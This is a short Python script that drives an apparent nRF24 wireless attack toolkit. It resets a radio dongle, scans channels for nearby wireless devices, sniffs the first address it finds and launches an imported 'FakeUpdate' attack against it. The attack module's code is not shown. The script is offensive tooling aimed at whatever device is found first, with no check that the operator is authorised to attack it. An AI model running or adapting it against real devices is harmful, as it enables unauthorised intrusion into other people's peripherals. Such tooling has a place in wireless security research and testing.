from tools import Scanner
from lib import nrf24_reset, nrf24
from attacks import hello_attack
from attacks import FakeUpdate_attack
import time

def ping_channel(radio, channels):
    ping = [0x0f, 0x0f, 0x0f, 0x0f]
    for channel in channels:
        radio.set_channel(channel)
        if radio.transmit_payload(ping):
            break


if __name__ == '__main__':
    timeout = int(input())
    nrf24_reset.reset_radio(0)
    print("dongle reset...")
    radio = nrf24.nrf24(0)
    radio.enter_promiscuous_mode()
    radio.enable_lna()
    channels = range(2, 84)
    devices_list = Scanner.scan(radio, channels, timeout)
    # print(devices_list['A4:DF:1B:AB:29'])
    radio.enter_sniffer_mode(devices_list[0][0])
    ping_channel(radio, channels)
    FakeUpdate_attack = FakeUpdate_attack.FakeUpdate_attack(devices_list[0][0], radio)
    FakeUpdate_attack.run()
